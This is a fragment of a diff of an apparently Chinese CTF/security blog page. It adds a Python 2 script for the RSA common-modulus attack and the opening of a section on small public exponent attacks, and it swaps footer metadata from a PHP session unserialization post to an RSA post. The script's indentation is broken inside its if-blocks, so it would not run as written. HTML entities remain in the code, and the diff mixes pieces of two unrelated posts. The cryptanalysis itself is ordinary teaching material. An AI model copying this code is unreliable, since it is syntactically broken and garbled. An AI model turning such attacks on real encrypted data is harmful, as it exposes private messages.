+n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249
+e1 = 773
+
+e2 = 839
+
+message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349
+
+message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535
+# s &amp; t
+gcd, s, t = gmpy2.gcdext(e1, e2)
+if s &lt; 0:
+       s = -s
+    message1 = gmpy2.invert(message1, n)
+if t &lt; 0:
+       t = -t
+    message2 = gmpy2.invert(message2, n)
+plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n
+print plain</code></pre><h3 id="小公钥指数攻击"><a href="#小公钥指数攻击" class="headerlink" title="小公钥指数攻击"></a>小公钥指数攻击</h3><p>e=3时</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
@@ -703,12 +697,12 @@ echo serialize($a);
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Session_unserlize</p>
+    <p><span class="copy-title">文章标题:</span>RSA</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-01, 19:33:07</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-01, 19:53:15</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/01/session_unserialize/" title="Session_unserlize">https://github.com/BrainLyh/2019/08/01/session_unserialize/</a>
+    <p><span class="copy-title">发布时间:</span>2018-05-23, 15:13:47</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-01, 19:52:48</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2018/05/23/RSA/" title="RSA">https://github.com/BrainLyh/2018/05/23/RSA/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
